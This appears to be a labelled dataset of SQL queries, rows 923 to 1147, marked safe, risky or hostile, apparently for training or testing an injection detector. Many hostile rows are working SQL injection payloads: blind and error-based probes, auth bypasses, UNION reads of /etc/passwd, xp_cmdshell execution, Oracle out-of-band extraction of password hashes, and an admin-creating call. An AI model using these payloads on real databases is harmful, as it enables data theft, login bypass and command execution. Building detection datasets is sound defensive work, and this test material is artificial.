+923,sl_error_based,hostile,"SELECT * FROM orders WHERE id = 1 ;DECLARE @'qxjkp' NVARCHAR(4000);SET @'qxjkp'=(SELECT 'qjvkq'+REPLACE((SELECT (CASE WHEN (3271=3271) THEN '1' ELSE '0' END)),'%','%%')+'qpbxq');RAISERROR(@'qxjkp',16,1)"
+924,write_bounded,safe,DELETE FROM orders WHERE id = 9912 AND title = 'Welcome Coupon'
+925,sl_auth_bypass,hostile,"SELECT id, username FROM users WHERE username = '.and'a'%2b'--+'union all select 1,2,3 from admin"
+926,schema_change,risky,ALTER TABLE payments MODIFY COLUMN name VARCHAR(32) NOT NULL
+927,sl_error_based,hostile,"SELECT * FROM sessions WHERE id = 1 AND ROW(3271,4471)>(SELECT COUNT(*),CONCAT('qjvkq',(SELECT (ELT(3271=3271,1))),'qpbxq',FLOOR(RAND(0)*2))x FROM (SELECT 8812 UNION SELECT 1 UNION SELECT 1 UNION SELECT 1)a GROUP BY x)"
+928,unbounded_write,risky,UPDATE refunds SET title = 'Welcome Coupon'
+929,schema_change,risky,ALTER TABLE coupons DROP COLUMN id
+930,unbounded_write,risky,UPDATE users SET status = 'active'
+931,unbounded_write,risky,UPDATE shops SET status = 'active'
+932,sl_boolean_blind,hostile,SELECT * FROM orders WHERE id = 1 AND 3271=3271
+933,sl_generic,hostile,SELECT * FROM orders WHERE id = 1 or 2 > 1
+934,sl_error_based,hostile,"SELECT id, title FROM users WHERE title = '(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'qjvkq'||(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 0 END) FROM DUAL)||'qpbxq'||CHR(62))) FROM DUAL)"
+935,admin_op,risky,SET GLOBAL innodb_buffer_pool_size = 64
+936,unbounded_write,risky,DELETE FROM coupons
+937,unbounded_write,risky,UPDATE products SET title = 'Summer Sale'
+938,sl_boolean_blind,hostile,"SELECT id, code FROM accounts WHERE code = 'IIF(3271=3271,3271,1/0)"
+939,write_bounded,safe,"INSERT INTO shops (amount, name) VALUES (250.50, 'Carol Wu')"
+940,read_simple,safe,"SELECT name, status FROM sessions WHERE created_at >= '2026-09-01' LIMIT 10"
+941,sl_boolean_blind,hostile,SELECT * FROM accounts WHERE id = 1 OR 3271=3271
+942,sl_mysql,hostile,SELECT * FROM products WHERE id = 1' and 1=(select count(*) from tablenames); --
+943,sl_time_blind,hostile,SELECT * FROM users WHERE id = 1 RLIKE (SELECT 3271 FROM (SELECT(SLEEP(5)))'qxjkp')
+944,sl_error_based,hostile,"SELECT id, code FROM orders WHERE code = '(UPDATEXML(3271,CONCAT('.','qjvkq',(SELECT (ELT(3271=3271,1))),'qpbxq'),4471))"
+945,sl_error_based,hostile,SELECT * FROM sessions WHERE id = 1 OR 3271=PARSE_DATA_SIZE('qjvkq'||CAST((SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 0 END)) AS VARCHAR)||'qpbxq')
+946,sl_time_blind,hostile,SELECT * FROM sessions WHERE id = 1 AND 3271=(SELECT count() FROM numbers(5) WHERE sleepEachRow(1)=0 SETTINGS max_block_size=1)
+947,sl_auth_bypass,hostile,"SELECT id, name FROM sessions WHERE name = '"" or 1=1"
+948,sl_auth_bypass,hostile,"SELECT id, name FROM orders WHERE name = 'false !pi() 0 ceil(pi()*pi()) 10 A ceil((pi()+pi())*pi()) 20 K"
+949,sl_auth_bypass,hostile,"SELECT id, username FROM sessions WHERE username = 'ceil(version()) 6 floor(pi()*version()) 16 G floor(version()*version()) 26 Q"
+950,sl_auth_bypass,hostile,"SELECT id, title FROM sessions WHERE title = '' or 1=1#"
+951,sl_generic,hostile,SELECT * FROM members WHERE id = 1 select name from syscolumns where id = (sele ...
+952,read_join_agg,safe,"SELECT a.amount, COUNT(b.id) AS cnt FROM products a JOIN products b ON b.user_id = a.id WHERE a.created_at >= '2026-09-01' GROUP BY a.amount ORDER BY cnt DESC LIMIT 50"
+953,sl_generic,hostile,SELECT * FROM accounts WHERE id = 1 or 'whatever' in ('whatever')
+954,admin_op,risky,GRANT ALTER ON shops.* TO 'ops'@'%'
+955,sl_auth_bypass,hostile,"SELECT id, title FROM users WHERE title = 'Q=%u0031%u0027%u0020%u0055%u004E%u0049%u004F%u004E%u0020%u0041%u004C%u004C%u0020%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u004E%u0055%u004C%u004C%u002C%u004E%u0055%u004C%u004C%u002C%u004E%u0055%u004C%u004C%u002C%u004E%u0055%u004C%u004C%u002C%u0043%u0048%u0052%u0028%u0031%u0031%u0033%u0029%u007C%u007C%u0043%u0048%u0052%u0028%u0031%u0030%u0037%u0029%u007C%u007C%u0043%u0048%u0052%u0028%u0031%u0031%u0032%u0029%u007C%u007C%u0043%u0048%u0052%u0028%u0031%u0030%u0036%u0029%u007C%u007C%u0043%u0048%u0052%u0028%u0031%u0031%u0033%u0029%u007C%u007C%u004E%u0056%u004C%u0028%u0043%u0041%u0053%u0054%u0028%u004F%u0057%u004E%u0045%u0052%u0020%u0041%u0053%u0020%u0056%u0041%u0052%u0043%u0048%u0041%u0052%u0028%u0034%u0030%u0030%u0030%u0029%u0029%u002C%u0043%u0048%u0052%u0028%u0033%u0032%u0029%u0029%u007C%u007C%u0043%u0048%u0052%u0028%u0031%u0031%u0033%u0029%u007C%u007C%u0043%u0048%u0052%u0028%u0031%u0031%u0032%u0029%u007C%u007C%u0043%u0048%u0052%u0028%u0031%u0031%u0038%u0029%u007C%u007C%u0043%u0048%u0052%u0028%u0031%u0031%u0032%u0029%u007C%u007C%u0043%u0048%u0052%u0028%u0031%u0031%u0033%u0029%u0020%u0046%u0052%u004F%u004D%u0020%u0028%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0044%u0049%u0053%u0054%u0049%u004E%u0043%u0054%u0028%u004F%u0057%u004E%u0045%u0052%u0029%u0020%u0046%u0052%u004F%u004D%u0020%u0053%u0059%u0053%u002E%u0041%u004C%u004C%u005F%u0054%u0041%u0042%u004C%u0045%u0053%u0029%u002D%u002D%u0020"
+956,sl_generic,hostile,"SELECT id, name FROM accounts WHERE name = '' or 0=0 #"
+957,sl_auth_bypass,hostile,"SELECT id, code FROM users WHERE code = '' and substr(data,1,1) = lower(conv(11,10,36))# 'b'"
+958,write_bounded,safe,UPDATE orders SET status = 'paid' WHERE id = 2048
+959,sl_oracle,hostile,"SELECT id, code FROM members WHERE code = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i"
+960,legit_lookalike,safe,SELECT COUNT(*) AS total FROM orders WHERE status = 'paid' -- 只统计已付款
+961,unbounded_write,risky,UPDATE sessions SET status = 'refunded'
+962,sl_oracle,hostile,"SELECT id, username FROM accounts WHERE username = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND 'i'='i"
+963,sl_time_blind,hostile,"SELECT id, email FROM products WHERE email = ',(SELECT (CASE WHEN (3271=3271) THEN DBMS_PIPE.RECEIVE_MESSAGE(''qxjkp'',5) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)"
+964,stacked,hostile,SELECT * FROM t WHERE id = 10; DELETE FROM members--
+965,sl_time_blind,hostile,"SELECT * FROM orders WHERE id = 1 or benchmark(10000000,MD5(1))#"
+966,sl_generic,hostile,"SELECT id, title FROM sessions WHERE title = '(sqlattempt2)"
+967,sl_auth_bypass,hostile,"SELECT id, username FROM members WHERE username = 'length(replace(data, 'a', '')) # length will be shorter"
+968,legit_lookalike,safe,SELECT password_updated_at FROM users WHERE id = 42
+969,legit_lookalike,safe,SELECT id FROM orders WHERE created_at BETWEEN '2026-01-01' AND '2026-09-01' AND amount > 0
+970,sl_auth_bypass,hostile,SELECT * FROM sessions WHERE id = 1 SELECT 1 FROM dual WHERE 1=1 AND-+-+-+-+~~((1))
+971,sl_generic,hostile,"SELECT id, code FROM sessions WHERE code = '<>""'%;)(&+"
+972,orm_inject,hostile,SELECT * FROM users WHERE name = 'x' OR '1'='1' /* HQL concat */
+973,sl_generic,hostile,"SELECT id, code FROM members WHERE code = ''; exec master..xp_cmdshell 'ping 172.10.1.255'--"
+974,sl_oracle,hostile,"SELECT id, title FROM members WHERE title = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i"
+975,sl_generic,hostile,"SELECT id, code FROM members WHERE code = 'admin' or '1'='1'/*"
+976,unbounded_write,risky,UPDATE carts SET amount = 250.50
+977,sl_error_based,hostile,SELECT * FROM orders WHERE id = 1 OR 3271=DBMS_UTILITY.SQLID_TO_SQLHASH(('qjvkq'||(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 0 END) FROM DUAL)||'qpbxq'))
+978,sl_error_based,hostile,"SELECT * FROM accounts WHERE id = 1 ,GTID_SUBSET(CONCAT('qjvkq',(SELECT (ELT(3271=3271,1))),'qpbxq'),3271)"
+979,sl_auth_bypass,hostile,"SELECT * FROM accounts WHERE id = 1 select * from table where id = 1 AND if((ascii(lower(substring((select user()),$i,1))))!=$s,1,benchmark(2000000,md5(now())))"
+980,sl_boolean_blind,hostile,"SELECT * FROM members WHERE id = 1 ;SELECT * FROM GENERATE_SERIES(3271,3271,CASE WHEN (3271=3271) THEN 1 ELSE 0 END) LIMIT 1"
+981,sl_time_blind,hostile,"SELECT id, name FROM orders WHERE name = 'SLEEP(1) /*' or SLEEP(1) or '"" or SLEEP(1) or ""*/"
+982,sl_time_blind,hostile,"SELECT id, username FROM users WHERE username = '(CASE WHEN (3271=3271) THEN !SLEEP(5) ELSE 3271 END)"
+983,sl_generic,hostile,"SELECT id, email FROM accounts WHERE email = 'admin"" or 1=1/*"
+984,waf_keyword,hostile,SELECT * FROM t WHERE id = 1e1 UNION SELECT 1
+985,sl_auth_bypass,hostile,"SELECT id, title FROM orders WHERE title = 'xxx'and'0'=(select top 1 '1' as [/*] from admin as [*//*]) union all select 1 as [*//*],2,username,password,5 from admin as [*/]"
+986,sl_auth_bypass,hostile,"SELECT id, title FROM products WHERE title = 'true+true 2 ceil(pi()+pi()+version()) 12 C ceil(pi()*ceil(pi()+pi())) 22 M"
+987,sl_auth_bypass,hostile,"SELECT id, email FROM orders WHERE email = 'floor(version()) 5 ceil(pi()*pi()+version()) 15 F floor(pi()*(version()+pi())) 25 P"
+988,read_join_agg,safe,"SELECT a.name, COUNT(b.id) AS cnt FROM products a JOIN orders b ON b.shop_id = a.id WHERE a.shop_id = 27 GROUP BY a.name ORDER BY cnt DESC LIMIT 50"
+989,read_simple,safe,"SELECT status, name FROM payments WHERE id = 100 LIMIT 50"
+990,sl_auth_bypass,hostile,SELECT * FROM users WHERE id = 1 SELECT(UNHEX(UNHEX(333532453335324533323335)));
+991,unbounded_write,risky,UPDATE reviews SET amount = 250.50
+992,data_exfil,hostile,"SELECT id, credit_card, cvv FROM payments"
+993,sl_time_blind,hostile,"SELECT id, email FROM members WHERE email = '(3271=3271 AND SLEEP(5))"
+994,read_simple,safe,"SELECT shop_id, name FROM products WHERE amount = 1299.00 LIMIT 100"
+995,sl_oracle,hostile,"SELECT id, username FROM members WHERE username = '' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i"
+996,sl_auth_bypass,hostile,"SELECT id, title FROM members WHERE title = 'ceil(pi()+pi()) 7 ceil(pi()*version()) 17 H ceil(version()*version()) 27 R"
+997,sl_generic,hostile,"SELECT id, title FROM orders WHERE title = 'having 1=1--"
+998,read_join_agg,safe,"SELECT a.title, COUNT(b.id) AS cnt FROM products a JOIN users b ON b.user_id = a.id WHERE a.amount = 250.50 GROUP BY a.title ORDER BY cnt DESC LIMIT 50"
+999,read_simple,safe,"SELECT created_at, status FROM payments WHERE id = 100 LIMIT 50"
+1000,sl_generic,hostile,"SELECT id, name FROM accounts WHERE name = 'admin"" or ""1""=""1""#"
+1001,write_bounded,safe,UPDATE sessions SET status = 'cancelled' WHERE id = 1
+1002,sl_generic,hostile,"SELECT id, title FROM orders WHERE title = 'admin"" #"
+1003,read_join_agg,safe,"SELECT a.status, COUNT(b.id) AS cnt FROM reviews a JOIN shops b ON b.user_id = a.id WHERE a.amount = 8.00 GROUP BY a.status ORDER BY cnt DESC LIMIT 50"
+1004,write_bounded,safe,UPDATE users SET amount = 100.00 WHERE id = 9912
+1005,sl_auth_bypass,hostile,"SELECT id, code FROM sessions WHERE code = '.and 1=(select 1 as ""/*"" from dual) union all select 1,2,3,4,5 from dual-- */"
+1006,unbounded_write,risky,UPDATE reviews SET title = 'Summer Sale'
+1007,sl_generic,hostile,SELECT * FROM products WHERE id = 1 or 2 between 1 and 3
+1008,sl_generic,hostile,"SELECT id, title FROM sessions WHERE title = '; begin declare @var varchar(8000) set @var=' ..."
+1009,json_sqli,hostile,SELECT * FROM t WHERE prefs->'$.x' = CAST('{}' AS JSON) OR SLEEP(5)
+1010,read_join_agg,safe,"SELECT a.user_id, COUNT(b.id) AS cnt FROM refunds a JOIN reviews b ON b.user_id = a.id WHERE a.email = 'carol@mail.com' GROUP BY a.user_id ORDER BY cnt DESC LIMIT 50"
+1011,write_bounded,safe,"INSERT INTO orders (title, user_id) VALUES ('VIP Upgrade', 1204)"
+1012,sl_error_based,hostile,"SELECT * FROM users WHERE id = 1 OR EXP(~(SELECT * FROM (SELECT CONCAT('qjvkq',(SELECT (ELT(3271=3271,1))),'qpbxq','x'))x))"
+1013,schema_change,risky,ALTER TABLE coupons DROP COLUMN amount
+1014,sl_error_based,hostile,"SELECT * FROM members WHERE id = 1 AND 3271=RAISE_ERROR('70001','qjvkq'||(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 0 END) FROM SYSIBM.SYSDUMMY1)||'qpbxq')"
+1015,sl_generic,hostile,"SELECT id, title FROM members WHERE title = '"" or """" """
+1016,sl_generic,hostile,"SELECT id, title FROM orders WHERE title = 'admin' or 1=1/*"
+1017,sl_error_based,hostile,"SELECT * FROM members WHERE id = 1 OR UPDATEXML(3271,CONCAT('.','qjvkq',(SELECT (ELT(3271=3271,1))),'qpbxq'),4471)"
+1018,sl_time_blind,hostile,"SELECT id, email FROM products WHERE email = 'SLEEP(1) /*‘ or SLEEP(1) or ‘“ or SLEEP(1) or “*/"
+1019,sl_oracle,hostile,"SELECT id, email FROM members WHERE email = '' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i"
+1020,sl_boolean_blind,hostile,SELECT * FROM sessions WHERE id = 1 AND CASE WHEN 3271=3271 THEN 3271 ELSE JSON(''qxjkp'') END
+1021,read_join_agg,safe,"SELECT a.title, COUNT(b.id) AS cnt FROM payments a JOIN carts b ON b.user_id = a.id WHERE a.amount = 8.00 GROUP BY a.title ORDER BY cnt DESC LIMIT 50"
+1022,sl_generic,hostile,"SELECT id, username FROM orders WHERE username = '(||6)"
+1023,read_simple,safe,"SELECT title, email FROM coupons WHERE name = 'Daniel Ma' LIMIT 50"
+1024,sl_time_blind,hostile,"SELECT * FROM products WHERE id = 1 OR 3271=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)"
+1025,legit_lookalike,safe,"SELECT id, name FROM active_users UNION ALL SELECT id, name FROM archived_users ORDER BY name"
+1026,admin_op,risky,GRANT DROP ON sessions.* TO 'readonly'@'%'
+1027,data_exfil,hostile,"SELECT email, password_hash FROM users"
+1028,admin_op,risky,GRANT DELETE ON sessions.* TO 'etl'@'%'
+1029,sl_time_blind,hostile,"SELECT * FROM sessions WHERE id = 1 PROCEDURE ANALYSE(EXTRACTVALUE(3271,CONCAT('\',(BENCHMARK(5000000,MD5(''qxjkp''))))),1)"
+1030,write_bounded,safe,DELETE FROM sessions WHERE id = 42 AND created_at >= '2026-06-30'
+1031,sl_error_based,hostile,"SELECT * FROM members WHERE id = 1 ,EXTRACTVALUE(3271,CONCAT('\','qjvkq',(SELECT (ELT(3271=3271,1))),'qpbxq'))"
+1032,sl_boolean_blind,hostile,"SELECT * FROM orders WHERE id = 1 AND ELT(3271=3271,4471)"
+1033,sl_boolean_blind,hostile,SELECT * FROM sessions WHERE id = 1 AND (SELECT (CASE WHEN (3271=3271) THEN NULL ELSE CAST(''qxjkp'' AS NUMERIC) END)) IS NULL
+1034,read_simple,safe,"SELECT id, email FROM refunds WHERE shop_id = 364 LIMIT 20"
+1035,blind_time,hostile,SELECT SLEEP(10)
+1036,sl_error_based,hostile,"SELECT * FROM sessions WHERE id = 1 OR 3271=CTXSYS.DRITHSX.SN(3271,('qjvkq'||(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 0 END) FROM DUAL)||'qpbxq'))"
+1037,read_simple,safe,"SELECT email, amount FROM users WHERE email = 'carol@mail.com' LIMIT 50"
+1038,admin_op,risky,GRANT INSERT ON users.* TO 'migration'@'%'
+1039,sl_generic,hostile,"SELECT id, username FROM members WHERE username = 'admin') or '1'='1'#"
+1040,sl_auth_bypass,hostile,SELECT * FROM members WHERE id = 1 and--!!!1=- -!!!0
+1041,write_bounded,safe,UPDATE reviews SET title = 'Free Shipping' WHERE id = 9912
+1042,sl_time_blind,hostile,"SELECT id, username FROM sessions WHERE username = '"";waitfor delay '0:0:5'--"
+1043,sl_oracle,hostile,"SELECT id, username FROM members WHERE username = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i"
+1044,sl_union,hostile,"SELECT * FROM sessions WHERE id = 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055"
+1045,read_simple,safe,"SELECT id, user_id FROM carts WHERE created_at >= '2026-01-01' LIMIT 100"
+1046,sl_generic,hostile,SELECT * FROM members WHERE id = 1 or '1'='1'--
+1047,read_simple,safe,"SELECT name, shop_id FROM reviews WHERE created_at >= '2026-01-01' LIMIT 50"
+1048,sl_generic,hostile,"SELECT id, title FROM accounts WHERE title = 'admin"") or (""1""=""1""#"
+1049,admin_op,risky,GRANT DROP ON shops.* TO 'migration'@'%'
+1050,sl_oracle,hostile,"SELECT id, username FROM sessions WHERE username = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i"
+1051,read_simple,safe,"SELECT updated_at, email FROM sessions WHERE shop_id = 364 LIMIT 20"
+1052,schema_change,risky,ALTER TABLE reviews DROP COLUMN user_id
+1053,sl_time_blind,hostile,"SELECT id, username FROM accounts WHERE username = ',(BEGIN IF (3271=3271) THEN DBMS_LOCK.SLEEP(5); ELSE DBMS_LOCK.SLEEP(0); END IF; END;)"
+1054,sl_auth_bypass,hostile,"SELECT id, email FROM accounts WHERE email = '' and substr(data,1,1) = char(97)# char(97,98)"
+1055,sl_time_blind,hostile,"SELECT id, name FROM sessions WHERE name = '(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000))"
+1056,admin_op,risky,REVOKE DELETE ON payments FROM 'app'@'%'
+1057,sl_time_blind,hostile,"SELECT * FROM products WHERE id = 1 or benchmark(10000000,MD5(1))#"
+1058,sl_auth_bypass,hostile,"SELECT id, email FROM products WHERE email = 'root"" --"
+1059,sl_generic,hostile,SELECT * FROM accounts WHERE (email = 'x'') or ('x')=('x
+1060,sl_generic,hostile,"SELECT id, email FROM orders WHERE email = '"" or """"^"""
+1061,sl_generic,hostile,"SELECT id, username FROM accounts WHERE username = 'a' or 3=3--"
+1062,write_bounded,safe,DELETE FROM payments WHERE id = 317 AND updated_at >= '2025-12-31'
+1063,schema_change,risky,ALTER TABLE reviews MODIFY COLUMN amount VARCHAR(32) NOT NULL
+1064,sl_union,hostile,"SELECT * FROM accounts WHERE id = 1 union select 1,load_file('/etc/passwd'),1,1,1;"
+1065,sl_auth_bypass,hostile,"SELECT * FROM users WHERE id = 1' union distinctrow select/*!USER*/(),/*!DATABASE*/()/*f*//*r*//*o*//*m*/users#"
+1066,sl_auth_bypass,hostile,"SELECT id, code FROM products WHERE code = '"" or 1=1/*"
+1067,sl_generic,hostile,"SELECT * FROM accounts WHERE (email = 'x'"") or (""x"")=(""x"
+1068,sl_generic,hostile,"SELECT id, username FROM members WHERE username = 'admin"" or ""1""=""1"
+1069,sl_generic,hostile,SELECT * FROM products WHERE id = 1;SELECT%20*
+1070,sl_generic,hostile,SELECT * FROM users WHERE id = 1 or 1=1/*
+1071,sl_generic,hostile,SELECT * FROM orders WHERE id = 1 exec(@s)
+1072,auth_bypass,hostile,SELECT * FROM users WHERE name = 'Book' OR 'x'='x'
+1073,sl_auth_bypass,hostile,"SELECT id, code FROM accounts WHERE code = 'root') or '1'='1'/*"
+1074,sl_generic,hostile,"SELECT id, name FROM accounts WHERE name = '"" or isNULL(1/0) /*"
+1075,schema_change,risky,ALTER TABLE orders MODIFY COLUMN email VARCHAR(32) NOT NULL
+1076,sl_boolean_blind,hostile,"SELECT id, email FROM members WHERE email = ',(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 3271*(SELECT 3271 FROM INFORMATION_SCHEMA.PLUGINS) END))"
+1077,admin_op,risky,GRANT DROP ON reviews.* TO 'migration'@'%'
+1078,sl_generic,hostile,SELECT * FROM users WHERE id = 1 or 'something' = 'some'+'thing'
+1079,unbounded_write,risky,UPDATE shops SET status = 'paid'
+1080,sl_file_enum,hostile,SELECT * FROM products WHERE id = 1 select * from master..sysserverse
+1081,sl_auth_bypass,hostile,"SELECT id, code FROM users WHERE code = '.and '0'=(select top 1 '--+' from admin) union all select 1,2,3 from admin"
+1082,sl_boolean_blind,hostile,"SELECT id, code FROM accounts WHERE code = '(CASE WHEN (3271=3271) THEN 3271 ELSE 3271*(SELECT 3271 FROM DUAL UNION SELECT 4471 FROM DUAL) END)"
+1083,admin_op,risky,REVOKE DROP ON shops FROM 'migration'@'%'
+1084,auth_bypass,hostile,SELECT * FROM users WHERE user = 'admin'#' AND pass = 'x'
+1085,sl_generic,hostile,"SELECT id, username FROM products WHERE username = '&apos;%20OR"
+1086,sl_generic,hostile,"SELECT id, code FROM sessions WHERE code = 'admin"") or (""1""=""1""--"
+1087,unbounded_write,risky,DELETE FROM shops
+1088,read_join_agg,safe,"SELECT a.status, COUNT(b.id) AS cnt FROM carts a JOIN users b ON b.shop_id = a.id WHERE a.status = 'refunded' GROUP BY a.status ORDER BY cnt DESC LIMIT 50"
+1089,sl_generic,hostile,SELECT * FROM sessions WHERE id = 1 or a=a
+1090,read_simple,safe,"SELECT shop_id, status FROM orders WHERE title = 'VIP Upgrade' LIMIT 50"
+1091,waf_encoding,hostile,SELECT * FROM t WHERE id = 1 OR 1 RLIKE 1
+1092,unbounded_write,risky,UPDATE orders SET amount = 19.99
+1093,write_bounded,safe,UPDATE users SET status = 'refunded' WHERE id = 2048
+1094,sl_generic,hostile,"SELECT id, code FROM accounts WHERE code = '""-"""
+1095,write_bounded,safe,DELETE FROM payments WHERE id = 2048 AND user_id = 88
+1096,admin_op,risky,REVOKE INSERT ON shops FROM 'readonly'@'%'
+1097,write_bounded,safe,UPDATE coupons SET updated_at = '2026-03-15' WHERE id = 317
+1098,sl_oracle,hostile,"SELECT id, name FROM accounts WHERE name = '' || myappadmin.adduser('admin', 'newpass') || '"
+1099,read_join_agg,safe,"SELECT a.status, COUNT(b.id) AS cnt FROM shops a JOIN carts b ON b.user_id = a.id WHERE a.email = 'alice@example.com' GROUP BY a.status ORDER BY cnt DESC LIMIT 50"
+1100,write_bounded,safe,DELETE FROM coupons WHERE id = 2048 AND created_at >= '2026-01-01'
+1101,sl_mssql,hostile,"SELECT id, username FROM orders WHERE username = '' ; drop table temp --"
+1102,read_join_agg,safe,"SELECT a.status, COUNT(b.id) AS cnt FROM shops a JOIN products b ON b.user_id = a.id WHERE a.title = 'VIP Upgrade' GROUP BY a.status ORDER BY cnt DESC LIMIT 50"
+1103,sl_time_blind,hostile,"SELECT id, code FROM members WHERE code = 'MAKE_SET(3271=3271,SLEEP(5))"
+1104,sl_error_based,hostile,SELECT * FROM members WHERE id = 1 OR 3271=('qjvkq'||(CASE WHEN (3271=3271) THEN '1' ELSE '0' END)||'qpbxq')
+1105,sl_boolean_blind,hostile,"SELECT id, email FROM users WHERE email = ',(SELECT CASE WHEN 3271=3271 THEN 1 ELSE RAISE_ERROR(70001, ''qxjkp'') END FROM SYSIBM.SYSDUMMY1)"
+1106,sl_auth_bypass,hostile,"SELECT id, username FROM orders WHERE username = '' and substr(data,1,1) = lower(conv(36,10,36))# 'z'"
+1107,sl_boolean_blind,hostile,"SELECT id, title FROM orders WHERE title = ',(CASE WHEN 3271=3271 THEN 1 ELSE NULL END)"
+1108,sl_time_blind,hostile,SELECT * FROM products WHERE id = 1)) or sleep(5)#
+1109,schema_change,risky,ALTER TABLE shops DROP COLUMN shop_id
+1110,sl_time_blind,hostile,"SELECT id, email FROM sessions WHERE email = '(SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))))"
+1111,sl_inline_query,hostile,"SELECT id, username FROM members WHERE username = '(SELECT 'qjvkq'||(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 0 END))::text||'qpbxq')"
+1112,json_sqli,hostile,"SELECT * FROM t WHERE data @> '{""admin"":true}'::jsonb OR 1=1"
+1113,admin_op,risky,GRANT DELETE ON sessions.* TO 'migration'@'%'
+1114,json_legit,safe,"UPDATE settings SET config = JSON_SET(config,'$.theme','dark') WHERE user_id = 7"
+1115,sl_auth_bypass,hostile,"SELECT id, username FROM users WHERE username = 'extractvalue(rand(0),convert(user() using latin1))"
+1116,auth_bypass,hostile,SELECT * FROM users WHERE user = '') OR ('1'='1'--'
+1117,error_based,hostile,"SELECT extractvalue(rand(0), concat(0x0a, version()))"
+1118,sl_auth_bypass,hostile,SELECT * FROM accounts WHERE id = 1' union/**/select/**/1
+1119,sl_generic,hostile,"SELECT id, code FROM accounts WHERE code = ''*'"
+1120,sl_error_based,hostile,"SELECT * FROM members WHERE id = 1 OR 3271=CONCAT('qjvkq',(SELECT (CASE WHEN (3271=3271) THEN '1' ELSE '0' END)),'qpbxq')"
+1121,sl_time_blind,hostile,SELECT * FROM accounts WHERE id = 1 OR (SELECT 3271 FROM (SELECT(!SLEEP(5)))'qxjkp')
+1122,sl_auth_bypass,hostile,"SELECT id, title FROM members WHERE title = '/?id=123/*\~500001/*/union/*\~500001/*/select/*\~500001/*/1,2,3"
+1123,sl_generic,hostile,"SELECT * FROM members WHERE (email = 'x'"")) or ((""x""))=((""x"
+1124,sl_time_blind,hostile,"SELECT * FROM products WHERE id = 1 AND 3271=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)"
+1125,sl_time_blind,hostile,SELECT * FROM products WHERE id = 1 OR SLEEP(5)
+1126,schema_change,risky,ALTER TABLE users DROP COLUMN amount
+1127,patt_postgres,hostile,SELECT * FROM t WHERE id = 1; SELECT current_setting('is_superuser')
+1128,sl_auth_bypass,hostile,SELECT * FROM accounts WHERE id = 1 select * from(user);
+1129,schema_change,risky,ALTER TABLE refunds DROP COLUMN shop_id
+1130,sl_generic,hostile,SELECT * FROM orders WHERE id = 1 or 1=1
+1131,schema_change,risky,ALTER TABLE sessions DROP COLUMN name
+1132,read_simple,safe,"SELECT email, amount FROM orders WHERE created_at >= '2026-09-01' LIMIT 100"
+1133,sl_auth_bypass,hostile,"SELECT id, email FROM users WHERE email = '' or 'a' = x'61 # hexadecimal"
+1134,sl_time_blind,hostile,"SELECT * FROM sessions WHERE id = 1 AND 3271=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)"
+1135,unbounded_write,risky,UPDATE payments SET amount = 250.50
+1136,sl_auth_bypass,hostile,SELECT * FROM members WHERE id = 1' union distinct select 1
+1137,sl_generic,hostile,SELECT * FROM products WHERE id = 1 or 'text' > 't'
+1138,write_bounded,safe,UPDATE products SET status = 'refunded' WHERE id = 317
+1139,schema_change,risky,ALTER TABLE payments MODIFY COLUMN amount VARCHAR(32) NOT NULL
+1140,sl_time_blind,hostile,"SELECT id, username FROM sessions WHERE username = '(CASE WHEN (3271=3271) THEN SLEEP(5) ELSE 3271 END)"
+1141,read_simple,safe,"SELECT status, title FROM sessions WHERE title = 'Free Shipping' LIMIT 50"
+1142,write_bounded,safe,UPDATE orders SET title = 'Summer Sale' WHERE id = 1
+1143,sl_generic,hostile,SELECT * FROM products WHERE id = 1 declare @q nvarchar (4000) select @q =
+1144,read_join_agg,safe,"SELECT a.updated_at, COUNT(b.id) AS cnt FROM sessions a JOIN products b ON b.shop_id = a.id WHERE a.created_at >= '2026-09-01' GROUP BY a.updated_at ORDER BY cnt DESC LIMIT 50"
+1145,sl_auth_bypass,hostile,SELECT * FROM products WHERE id = 1' union%a0select%a01
+1146,schema_change,risky,ALTER TABLE reviews MODIFY COLUMN title VARCHAR(32) NOT NULL
+1147,read_join_agg,safe,"SELECT a.created_at, COUNT(b.id) AS cnt FROM orders a JOIN carts b ON b.user_id = a.id WHERE a.name = 'Alice Chen' GROUP BY a.created_at ORDER BY cnt DESC LIMIT 50"
